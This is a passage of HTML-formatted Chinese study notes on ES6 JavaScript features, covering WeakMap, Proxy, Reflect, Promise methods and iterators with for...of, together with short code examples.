class="string">&#x27;example&#x27;</span>);</span><br><span class="line"></span><br><span class="line">wm.set(element, <span class="string">&#x27;some information&#x27;</span>);</span><br><span class="line">wm.get(element) <span class="comment">// &quot;some information&quot;</span></span><br></pre></td></tr></table></figure><h3 id="WeakMap-的语法"><a href="#WeakMap-的语法" class="headerlink" title="WeakMap 的语法"></a>WeakMap 的语法</h3><p>WeakMap 与 Map 在 API 上的区别主要是两个，一是没有遍历操作（即没有<code>keys()</code>、<code>values()</code>和<code>entries()</code>方法），也没有<code>size</code>属性。二是无法清空，即不支持<code>clear</code>方法。因此，<code>WeakMap</code>只有四个方法可用：<code>get()</code>、<code>set()</code>、<code>has()</code>、<code>delete()</code>。</p><h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><h2 id="1、概述-1"><a href="#1、概述-1" class="headerlink" title="1、概述"></a>1、概述</h2><p>Proxy 用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种“元编程”，即对编程语言进行编程。</p><p>Proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，因此提供了一种机制，可以对外界的访问进行过滤和改写。Proxy 这个词的原意是代理，用在这里表示由它来“代理”某些操作，可以译为“代理器”。</p><p>…(todo)</p><h1 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h1><h2 id="1、概述-2"><a href="#1、概述-2" class="headerlink" title="1、概述"></a>1、概述</h2><p><code>Reflect</code>对象的设计目的有这样几个。</p><p>（1） 将<code>Object</code>对象的一些明显属于语言内部的方法（比如<code>Object.defineProperty</code>），放到<code>Reflect</code>对象上。也就是说，从<code>Reflect</code>对象上可以拿到语言内部的方法。</p><p>（2） 修改某些<code>Object</code>方法的返回结果，让其变得更合理。比如，<code>Object.defineProperty(obj, name, desc)</code>在无法定义属性时，会抛出一个错误，而<code>Reflect.defineProperty(obj, name, desc)</code>则会返回<code>false</code>。</p><p>（3） 让<code>Object</code>操作都变成函数行为。某些<code>Object</code>操作是命令式，比如<code>name in obj</code>和<code>delete obj[name]</code>，而<code>Reflect.has(obj, name)</code>和<code>Reflect.deleteProperty(obj, name)</code>让它们变成了函数行为。</p><p>（4）<code>Reflect</code>对象的方法与<code>Proxy</code>对象的方法一一对应，只要是<code>Proxy</code>对象的方法，就能在<code>Reflect</code>对象上找到对应的方法。这就让<code>Proxy</code>对象可以方便地调用对应的<code>Reflect</code>方法，完成默认行为，作为修改行为的基础。</p><p>…(todo)</p><h1 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h1><h2 id="1、Promise-的含义"><a href="#1、Promise-的含义" class="headerlink" title="1、Promise 的含义"></a>1、Promise 的含义</h2><p>所谓<code>Promise</code>，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。</p><p><code>Promise</code>对象有以下两个特点。</p><p>（1）对象的状态不受外界影响。<code>Promise</code>对象代表一个异步操作，有三种状态：<code>pending</code>（进行中）、<code>fulfilled</code>（已成功）和<code>rejected</code>（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。</p><p>（2）一旦状态改变，就不会再变，任何时候都可以得到这个结果。<code>Promise</code>对象的状态改变，只有两种可能：从<code>pending</code>变为<code>fulfilled</code>和从<code>pending</code>变为<code>rejected</code>。只要这两种情况发生，状态就凝固了，不会再变了，会一直保持这个结果，这时就称为 resolved（已定型）。如果改变已经发生了，你再对<code>Promise</code>对象添加回调函数，也会立即得到这个结果。这与事件（Event）完全不同，事件的特点是，如果你错过了它，再去监听，是得不到结果的。</p><p>有了<code>Promise</code>对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。</p><p><code>Promise</code>也有一些缺点。首先，无法取消<code>Promise</code>，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，<code>Promise</code>内部抛出的错误，不会反应到外部。第三，当处于<code>pending</code>状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。</p><h2 id="2、基本用法"><a href="#2、基本用法" class="headerlink" title="2、基本用法"></a>2、基本用法</h2><p>下面代码创造了一个<code>Promise</code>实例。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ... some code</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="comment">/* 异步操作成功 */</span>)&#123;</span><br><span class="line">    resolve(value);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    reject(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>Promise</code>构造函数接受一个函数作为参数，该函数的两个参数分别是<code>resolve</code>和<code>reject</code>。</p><p>Promise 新建后就会立即执行。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Promise&#x27;</span>);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolved.&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Hi!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise</span></span><br><span class="line"><span class="comment">// Hi!</span></span><br><span class="line"><span class="comment">// resolved</span></span><br></pre></td></tr></table></figure><p>上面代码中，Promise 新建后立即执行，所以首先输出的是<code>Promise</code>。然后，<code>then</code>方法指定的回调函数，将在当前脚本所有同步任务执行完才会执行，所以<code>resolved</code>最后输出。</p><h2 id="3、Promise-prototype-then"><a href="#3、Promise-prototype-then" class="headerlink" title="3、Promise.prototype.then()"></a>3、Promise.prototype.then()</h2><p>Promise 实例具有<code>then</code>方法，也就是说，<code>then</code>方法是定义在原型对象<code>Promise.prototype</code>上的。<code>then</code>方法返回的是一个新的<code>Promise</code>实例（注意，不是原来那个<code>Promise</code>实例）。因此可以采用链式写法，即<code>then</code>方法后面再调用另一个<code>then</code>方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">getJSON(<span class="string">&quot;/post/1.json&quot;</span>).then(</span><br><span class="line">  <span class="function"><span class="params">post</span> =&gt;</span> getJSON(post.commentURL)</span><br><span class="line">).then(</span><br><span class="line">  <span class="function"><span class="params">comments</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;resolved: &quot;</span>, comments),</span><br><span class="line">  <span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;rejected: &quot;</span>, err)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>上面代码中，第一个<code>then</code>方法指定的回调函数，返回的是另一个<code>Promise</code>对象。这时，第二个<code>then</code>方法指定的回调函数，就会等待这个新的<code>Promise</code>对象状态发生变化。如果变为<code>resolved</code>，就调用第一个回调函数，如果状态变为<code>rejected</code>，就调用第二个回调函数。</p><h2 id="4、Promise-prototype-catch"><a href="#4、Promise-prototype-catch" class="headerlink" title="4、Promise.prototype.catch()"></a>4、Promise.prototype.catch()</h2><p><code>Promise.prototype.catch()</code>方法是<code>.then(null, rejection)</code>或<code>.then(undefined, rejection)</code>的别名，用于指定发生错误时的回调函数。</p><p>Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个<code>catch</code>语句捕获。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">getJSON(<span class="string">&#x27;/post/1.json&#x27;</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(post.commentURL);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">comments</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 处理前面三个Promise产生的错误</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，一共有三个 Promise 对象：一个由<code>getJSON()</code>产生，两个由<code>then()</code>产生。它们之中任何一个抛出的错误，都会被最后一个<code>catch()</code>捕获。</p><p>一般来说，不要在<code>then()</code>方法里面定义 Reject 状态的回调函数（即<code>then</code>的第二个参数），而是使用<code>catch</code>方法。Promise 对象抛出的错误不会传递到外层代码，即不会有任何反应。通俗的说法就是“Promise 会吃掉错误”。</p><h2 id="5、Promise-prototype-finally"><a href="#5、Promise-prototype-finally" class="headerlink" title="5、Promise.prototype.finally()"></a>5、Promise.prototype.finally()</h2><p><code>finally()</code>方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。<code>finally</code>方法的回调函数不接受任何参数，这意味着没有办法知道，前面的 Promise 状态到底是<code>fulfilled</code>还是<code>rejected</code>。这表明，<code>finally</code>方法里面的操作，应该是与状态无关的，不依赖于 Promise 的执行结果。</p><h2 id="6、Promise-all"><a href="#6、Promise-all" class="headerlink" title="6、Promise.all()"></a>6、Promise.all()</h2><p><code>Promise.all()</code>方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.all([p1, p2, p3]);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>Promise.all()</code>方法接受一个数组作为参数，<code>p1</code>、<code>p2</code>、<code>p3</code>都是 Promise 实例。另外，<code>Promise.all()</code>方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。</p><p><code>p</code>的状态由<code>p1</code>、<code>p2</code>、<code>p3</code>决定，分成两种情况。</p><p>（1）只有<code>p1</code>、<code>p2</code>、<code>p3</code>的状态都变成<code>fulfilled</code>，<code>p</code>的状态才会变成<code>fulfilled</code>，此时<code>p1</code>、<code>p2</code>、<code>p3</code>的返回值组成一个数组，传递给<code>p</code>的回调函数。</p><p>（2）只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个被<code>rejected</code>，<code>p</code>的状态就变成<code>rejected</code>，此时第一个被<code>reject</code>的实例的返回值，会传递给<code>p</code>的回调函数。</p><p>注意，如果作为参数的 Promise 实例，自己定义了<code>catch</code>方法，那么它一旦被<code>rejected</code>，并不会触发<code>Promise.all()</code>的<code>catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;报错了&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([p1, p2])</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e));</span><br><span class="line"><span class="comment">// [&quot;hello&quot;, Error: 报错了]</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>p1</code>会<code>resolved</code>，<code>p2</code>首先会<code>rejected</code>，但是<code>p2</code>有自己的<code>catch</code>方法，该方法返回的是一个新的 Promise 实例，<code>p2</code>指向的实际上是这个实例。该实例执行完<code>catch</code>方法后，也会变成<code>resolved</code>，导致<code>Promise.all()</code>方法参数里面的两个实例都会<code>resolved</code>，因此会调用<code>then</code>方法指定的回调函数，而不会调用<code>catch</code>方法指定的回调函数。</p><p>如果<code>p2</code>没有自己的<code>catch</code>方法，就会调用<code>Promise.all()</code>的<code>catch</code>方法。</p><h2 id="7、Promise-race"><a href="#7、Promise-race" class="headerlink" title="7、Promise.race()"></a>7、Promise.race()</h2><p><code>Promise.race()</code>方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.race([p1, p2, p3]);</span><br></pre></td></tr></table></figure><p>上面代码中，只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个实例率先改变状态，<code>p</code>的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给<code>p</code>的回调函数。如果指定时间内没有获得结果，就将 Promise 的状态变为<code>reject</code>，否则变为<code>resolve</code>。</p><h2 id="8、Promise-allSettled"><a href="#8、Promise-allSettled" class="headerlink" title="8、Promise.allSettled()"></a>8、Promise.allSettled()</h2><p><code>Promise.allSettled()</code>方法接受一组 Promise 实例作为参数，包装成一个新的 Promise 实例。只有等到所有这些参数实例都返回结果，不管是<code>fulfilled</code>还是<code>rejected</code>，包装实例才会结束。该方法由 <a href="https://github.com/tc39/proposal-promise-allSettled">ES2020</a> 引入。</p><h2 id="9、Promise-any"><a href="#9、Promise-any" class="headerlink" title="9、Promise.any()"></a>9、Promise.any()</h2><p>ES2021 引入了<code>Promise.any()</code>方法。该方法接受一组 Promise 实例作为参数，包装成一个新的 Promise 实例返回。只要参数实例有一个变成<code>fulfilled</code>状态，包装实例就会变成<code>fulfilled</code>状态；如果所有参数实例都变成<code>rejected</code>状态，包装实例就会变成<code>rejected</code>状态。</p><h2 id="10、Promise-resolve"><a href="#10、Promise-resolve" class="headerlink" title="10、Promise.resolve()"></a>10、Promise.resolve()</h2><p>有时需要将现有对象转为 Promise 对象，<code>Promise.resolve()</code>方法就起到这个作用。</p><p><code>Promise.resolve()</code>等价于下面的写法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(<span class="string">&#x27;foo&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="11、Promise-reject"><a href="#11、Promise-reject" class="headerlink" title="11、Promise.reject()"></a>11、Promise.reject()</h2><p><code>Promise.reject(reason)</code>方法也会返回一个新的 Promise 实例，该实例的状态为<code>rejected</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.reject(<span class="string">&#x27;出错了&#x27;</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(<span class="string">&#x27;出错了&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="12、应用"><a href="#12、应用" class="headerlink" title="12、应用"></a>12、应用</h2><h3 id="加载图片"><a href="#加载图片" class="headerlink" title="加载图片"></a>加载图片</h3><p>我们可以将图片的加载写成一个<code>Promise</code>，一旦加载完成，<code>Promise</code>的状态就发生变化。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> preloadImage = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> image = <span class="keyword">new</span> Image();</span><br><span class="line">    image.onload  = resolve;</span><br><span class="line">    image.onerror = reject;</span><br><span class="line">    image.src = path;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="13、Promise-try"><a href="#13、Promise-try" class="headerlink" title="13、Promise.try()"></a>13、Promise.try()</h2><p>实际开发中，经常遇到一种情况：不知道或者不想区分，函数<code>f</code>是同步函数还是异步操作，但是想用 Promise 来处理它。因为这样就可以不管<code>f</code>是否包含异步操作，都用<code>then</code>方法指定下一步流程，用<code>catch</code>方法处理<code>f</code>抛出的错误。一般就会采用下面的写法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve().then(f)</span><br></pre></td></tr></table></figure><p>上面的写法有一个缺点，就是如果<code>f</code>是同步函数，那么它会在本轮事件循环的末尾执行。</p><p>那么有没有一种方法，让同步函数同步执行，异步函数异步执行，并且让它们具有统一的 API 呢？</p><ul><li><p>用<code>async</code>函数。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;now&#x27;</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; f())().then(...).catch(...);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;next&#x27;</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><p>上面代码中，第二行是一个立即执行的匿名函数，会立即执行里面的<code>async</code>函数，因此如果<code>f</code>是同步的，就会得到同步的结果；如果<code>f</code>是异步的，就可以用<code>then</code>。</p></li></ul><p><code>Promise.try</code>方法替代。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;now&#x27;</span>);</span><br><span class="line"><span class="built_in">Promise</span>.try(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;next&#x27;</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><h1 id="Iterator-和-for…of-循环"><a href="#Iterator-和-for…of-循环" class="headerlink" title="Iterator 和 for…of 循环"></a>Iterator 和 for…of 循环</h1><h2 id="1、Iterator（遍历器）的概念"><a href="#1、Iterator（遍历器）的概念" class="headerlink" title="1、Iterator（遍历器）的概念"></a>1、Iterator（遍历器）的概念</h2><p>JavaScript 原有的表示“集合”的数据结构，主要是数组（<code>Array</code>）和对象（<code>Object</code>），ES6 又添加了<code>Map</code>和<code>Set</code>。遍历器（Iterator）是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署 Iterator 接口，就可以完成遍历操作（即依次处理该数据结构的所有成员）。</p><p>Iterator 的作用有三个：</p><ul><li>一是为各种数据结构，提供一个统一的、简便的访问接口；</li><li>二是使得数据结构的成员能够按某种次序排列；</li><li>三是 ES6 创造了一种新的遍历命令<code>for...of</code>循环，Iterator 接口主要供<code>for...of</code>消费。</li></ul><p>Iterator 的遍历过程是这样的。</p><p>（1）创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象。</p><p>（2）第一次调用指针对象的<code>next</code>方法，可以将指针指向数据结构的第一个成员。</p><p>（3）第二次调用指针对象的<code>next</code>方法，指针就指向数据结构的第二个成员。</p><p>（4）不断调用指针对象的<code>next</code>方法，直到它指向数据结构的结束位置。</p><p>每一次调用<code>next</code>方法，都会返回数据结构的当前成员的信息。具体来说，就是返回一个包含<code>value</code>和<code>done</code>两个属性的对象。其中，<code>value</code>属性是当前成员的值，<code>done</code>属性是一个布尔值，表示遍历是否结束。</p><h2 id="2、默认-Iterator-接口"><a href="#2、默认-Iterator-接口" class="headerlink" title="2、默认 Iterator 接口"></a>2、默认 Iterator 接口</h2><p>Iterator 接口的目的，就是为所有数据结构，提供了一种统一的访问机制，即<code>for...of</code>循环。当使用<code>for...of</code>循环遍历某种数据结构时，该循环会自动去寻找 Iterator 接口。</p><p>一种数据结构只要部署了 Iterator 接口，我们就称这种数据结构是“可遍历的”。原生具备 Iterator 接口的数据结构如下。</p><ul><li>Array</li><li>Map</li><li>Set</li><li>String</li><li>TypedArray</li><li>函数的 arguments 对象</li><li>NodeList 对象</li></ul><h2 id="3、调用-Iterator-接口的场合"><a href="#3、调用-Iterator-接口的场合" class="headerlink" title="3、调用 Iterator 接口的场合"></a>3、调用 Iterator 接口的场合</h2><p><strong>（1）解构赋值</strong></p><p>对数组和 Set 结构进行解构赋值时，会默认调用<code>Symbol.iterator</code>方法。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>().add(<span class="string">&#x27;a&#x27;</span>).add(<span class="string">&#x27;b&#x27;</span>).add(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x,y] = set;</span><br><span class="line"><span class="comment">// x=&#x27;a&#x27;; y=&#x27;b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [first, ...rest] = set;</span><br><span class="line"><span class="comment">// first=&#x27;a&#x27;; rest=[&#x27;b&#x27;,&#x27;c&#x27;];</span></span><br></pre></td></tr></table></figure><p><strong>（2）扩展运算符</strong></p><p>扩展运算符（…）也会调用默认的 Iterator 接口。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例一</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">[...str] <span class="comment">//  [&#x27;h&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 例二</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, ...arr, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;]</span></span><br></pre></td></tr></table></figure><p>实际上，这提供了一种简便机制，可以将任何部署了 Iterator 接口的数据结构，转为数组。</p><p><strong>（3）yield*</strong></p><p><code>yield*</code>后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口。</p><p><strong>（4）其他场合</strong></p><p>由于数组的遍历会调用遍历器接口，所以任何接受数组作为参数的场合，其实都调用了遍历器接口。下面是一些例子。</p><ul><li>for…of</li><li>Array.from()</li><li>Map(), Set(), WeakMap(), WeakSet()（比如<code>new Map([[&#39;a&#39;,1],[&#39;b&#39;,2]])</code>）</li><li>Promise.all()</li><li>Promise.race()</li></ul><h2 id="4、字符串的-Iterator-接口"><a href="#4、字符串的-Iterator-接口" class="headerlink" title="4、字符串的 Iterator 接口"></a>4、字符串的 Iterator 接口</h2><p>字符串是一个类似数组的对象，也原生具有 Iterator 接口。</p><h2 id="5、for…of-循环"><a href="#5、for…of-循环" class="headerlink" title="5、for…of 循环"></a>5、for…of 循环</h2><p><code>for...of</code>循环内部调用的是数据结构的<code>Symbol.iterator</code>方法。<code>for...of</code>循环可以使用的范围包括数组、Set 和 Map 结构、某些类似数组的对象（比如<code>arguments</code>对象、DOM NodeList 对象）、Generator 对象，以及字符串。</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> arr) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(v); <span class="comment">// red green blue</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JavaScript 原有的<code>for...in</code>循环，只能获得对象的键名，不能直接获取键值。ES6 提供<code>for...of</code>循环，允许遍历获得键值。</p><h3 id="Set-和-Map-结构"><a href="#Set-和-Map-结构" class="headerlink" title="Set 和 Map 结构"></a>Set 和 Map 结构</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> engines = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&quot;Gecko&quot;</span>, <span class="string">&quot;Trident&quot;</span>, <span class="string">&quot;Webkit&quot;</span>, <span class="string">&quot;Webkit&quot;</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> e <span class="keyword">of</span> engines) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Gecko</span></span><br><span class="line"><span class="comment">// Trident</span></span><br><span class="line"><span class="comment">// Webkit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> es6 = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">es6.set(<span class="string">&quot;edition&quot;</span>, <span class="number">6</span>);</span><br><span class="line">es6.set(<span class="string">&quot;committee&quot;</span>, <span class="string">&quot;TC39&quot;</span>);</span><br><span class="line">es6.set(<span class="string">&quot;standard&quot;</span>, <span class="string">&quot;ECMA-262&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> [name, value] <span class="keyword">of</span> es6) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(name + <span class="string">&quot;: &quot;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// edition: 6</span></span><br><span class="line"><span class="comment">// committee: TC39</span></span><br><span class="line"><span class="comment">// standard: ECMA-262</span></span><br></pre></td></tr></table></figure><p>值得注意的地方有两个，首先，遍历的顺序是按照各个成员被添加进数据结构的顺序。其次，Set 结构遍历时，返回的是一个值，而 Map 结构遍历时，返回的是一个<strong>数组</strong>，该数组的两个成员分别为当前 Map 成员的键名和键值。</p><h3 id="计算生成的数据结构"><a href="#计算生成的数据结构" class="headerlink" title="计算生成的数据结构"></a>计算生成的数据结构</h3><p>ES6 的数组、Set、Map 都部署了以下三个方法，调用后都返回遍历器对象。</p><ul><li><code>entries()</code> 返回一个遍历器对象，用来遍历<code>[键名, 键值]</code>组成的数组。对于数组，键名就是索引值；对于 Set，键名与键值相同。Map 结构的 Iterator 接口，默认就是调用<code>entries</code>方法。</li><li><code>keys()</code> 返回一个遍历器对象，用来遍历所有的键名。</li><li><code>values()</code> 返回一个遍历器对象，用来遍历所有的键值。</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> pair <span class="keyword">of</span> arr.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(pair);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [0, &#x27;a&#x27;]</span></span><br><span class="line"><span class="comment">// [1, &#x27;b&#x27;]</span></span><br><span class="line"><span class="comment">// [2, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="类似数组的对象"><a href="#类似数组的对象" class="headerlink" title="类似数组的对象"></a>类似数组的对象</h3><p>类似数组的对象包括好几类。下面是<code>for...of</code>循环用于字符串、DOM NodeList 对象、<code>arguments</code>对象的例子。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> s <span class="keyword">of</span> str) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s); <span class="comment">// h e l l o</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DOM NodeList对象</span></span><br><span class="line"><span class="keyword">let</span> paras = <span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> p <span class="keyword">of</span> paras) &#123;</span><br><span class="line">  p.classList.add(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// arguments对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printArgs</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> x <span class="keyword">of</span> <span class="built_in">arguments</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">printArgs(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="comment">// &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">// 